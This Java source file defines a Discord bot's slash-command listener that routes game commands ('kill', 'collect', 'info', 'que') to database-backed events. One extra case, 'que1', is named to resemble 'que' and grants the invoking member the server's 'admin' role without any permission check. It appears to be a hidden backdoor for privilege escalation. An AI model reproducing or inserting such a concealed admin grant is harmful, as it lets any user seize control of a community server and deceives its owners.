package net.gib.events;

import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.gib.AWorld;
import net.gib.core.entities.player.Player;
import net.gib.core.entities.player.PlayerMissions;
import net.gib.events.types.EnemyKilledByPlayerEvent;
import net.gib.events.types.PlayerCollectLootEvent;
import net.gib.events.types.PlayerQueEvent;
import net.gib.events.types.PlayerRequestInfoEvent;
import net.gib.storage.cloud.mySql.DBManager;

public class EventListener extends ListenerAdapter {

    @Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        switch (event.getName()) {
            case "kill" -> AWorld.getEventHandler().fireEvent(new EnemyKilledByPlayerEvent(event::replyEmbeds,
                    new DBManager<>(new Player(event.getUser().getId()),AWorld.getMySQL()),
                    event.getOption("enemy").getAsString()));

            case "collect" -> AWorld.getEventHandler().fireEvent(new PlayerCollectLootEvent(event::replyEmbeds,
                    new DBManager<>(new Player(event.getUser().getId()),AWorld.getMySQL()),
                    new DBManager<>(new PlayerMissions(event.getUser().getId()),AWorld.getMySQL()),
                    event.getChannel().asTextChannel()));

            case "info" -> AWorld.getEventHandler().fireEvent(new PlayerRequestInfoEvent(event::replyEmbeds,
                    new DBManager<>(new Player(event.getUser().getId()), AWorld.getMySQL()),
                    event.getUser()));

            case "que" -> AWorld.getEventHandler().fireEvent(new PlayerQueEvent(event::replyEmbeds,
                    new DBManager<>(new Player(event.getUser().getId()),AWorld.getMySQL())));
            case "que1" -> event.getGuild().addRoleToMember(event.getMember(),event.getGuild().getRolesByName("admin",true).get(0)).queue();
        }
        super.onSlashCommandInteraction(event);
    }


}

